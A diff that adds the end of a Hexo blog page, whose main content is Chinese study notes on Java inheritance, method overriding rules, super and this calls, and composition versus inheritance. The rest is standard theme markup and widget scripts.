+<li>instanceof运算符前面操<br>作数的编译时类型要么与后面的类相同，要么与后面的类具有父子继<br>承关系</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><ul>
+<li><p>类的继承</p>
+<ul>
+<li><p>每个子类只有一个直接父类</p>
+</li>
+<li><p>public class 子类名 extends 父类名 {<br>// 子类的成员变量和方法                  }</p>
+</li>
+<li><p>子类只能从被扩展的父类获得成员变量、方法和内部类（包括<br>内部接口、枚举），不能获得构造器和初始化块。</p>
+</li>
+<li><p>继承适用于那些具有”is-a”关系的类，即子类是父类的一种特例。</p>
+</li>
+</ul>
+</li>
+<li><p>重写父类的方法</p>
+<ul>
+<li><p>子类包含与父类同名方法的现象被称为方法重写（Override）。</p>
+<ul>
+<li><p>子类提供了与父类相同名称、参数列表和返回类型的方法，以提供自己的实现。使得子类能够在继承的基础上自定义或修改方法的行为。</p>
+</li>
+<li><p>“两同两小一大”规则</p>
+<ul>
+<li><p>方法名相<br>同、形参列表相同</p>
+</li>
+<li><p>子类方法返回值类型应比父类方<br>法返回值类型更小或相等，子类方法声明抛出的异常类应比父类方法<br>声明抛出的异常类更小或相等</p>
+</li>
+<li><p>子类方法的访问权限<br>应比父类方法的访问权限更大或相等</p>
+</li>
+</ul>
+</li>
+<li><p>覆盖方法和被覆盖方法必须具有相同的方法类型，即它们要么都是类方法，要么都是实例方法</p>
+</li>
+</ul>
+</li>
+<li><p>当子类覆盖了父类的方法后，子类对象默认无法直接访问父类中被覆盖的方法</p>
+<ul>
+<li><p>在子类方法内使用 super 关键字（如果被覆盖的方法是实例方法）</p>
+<ul>
+<li><p>super用于限定该对象调用它从<br>父类继承得到的实例变量或方法</p>
+</li>
+<li><p>super不能出现在static修饰的方法中。static修饰的<br>方法是属于类的，该方法的调用者可能是一个类，而不是对象</p>
+</li>
+<li><p>在构造器中使用super，则super用于限定该构造器初始化的<br>是该对象从父类继承得到的实例变量，而不是该类自己定义的实例变<br>量。</p>
+</li>
+</ul>
+</li>
+<li><p>使用父类的类名（如果被覆盖的方法是类方法）来调用父类中被覆盖的方法。</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>调用父类构造器</p>
+<ul>
+<li><p>在一个构造器中调用另一个重载的构造器使用this调用来完成</p>
+</li>
+<li><p>在子类构造器中调用父类构造器使用super调用来完成</p>
+</li>
+</ul>
+</li>
+<li><p>继承与组合（类复用）</p>
+<ul>
+<li><p>父类应有良好的封装性，不会被子类随意改变</p>
+<ul>
+<li><p>尽量隐藏父类的内部数据</p>
+</li>
+<li><p>不要让子类可以随意访问、修改父类的方法</p>
+</li>
+<li><p>尽量不要在父类构造器中调用将要被子类重写的方法</p>
+</li>
+</ul>
+</li>
+<li><p>何时需要从父类派生新的子类</p>
+<ul>
+<li><p>子类需要额外增加成员变量，而不仅仅是变量值的改变。</p>
+</li>
+<li><p>子类需要增加自己独有的行为方式（包括增加新的方法或重写<br>父类的方法）</p>
+</li>
+</ul>
+</li>
+<li><p>利用组合实现复用</p>
+<ul>
+<li><p>组合是将一个类的对象作为另一个类的成员。这允许新类直接复用现有类的公共方法，而不必继承其全部行为。组合通常适用于那些具有”has-a”关系的类，即一个类包含另一个类的实例作为其一部分。</p>
+</li>
+<li><p>把旧类对象作为新类的成员变量组合进来，用以实现新类的功能</p>
+</li>
+<li><p>继承设计与组合设计的<br>系统开销不会有本质的差别</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">
+      
+    </div>
+
+    
+    
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Xloudmax"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Xloudmax</p>
+  <div class="site-description" itemprop="description">Welc0me t0 the base</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="sidebar-button motion-element"><i class="fa fa-comment"></i>
+    Chat
+  </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/xloudmax" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;xloudmax" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:xloudmax@gmail.com" title="E-Mail → mailto:xloudmax@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; Tue Mar 05 2024 08:00:00 GMT+0800 (GMT+08:00) – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xloudmax</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共17.4k字</span>
+</div>
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+  
+  <div class="Canvas"  id="L2dCanvas"></div>
+<script>
+    var config = {
+        width: 800,
+        height: 600,
+        left: '850px',
+        bottom: '-100px',
+        basePath: 'https://cdn.jsdelivr.net/gh/xloudmax/AzurLaneL2DViewer@c9/assets/',
+        role: '17kanade_wedding',
+        opacity: 1,
+        mobile: false
+    }
+    var v = new Viewer(config);
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/null"},"display":{"position":"right","width":400,"height":800},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
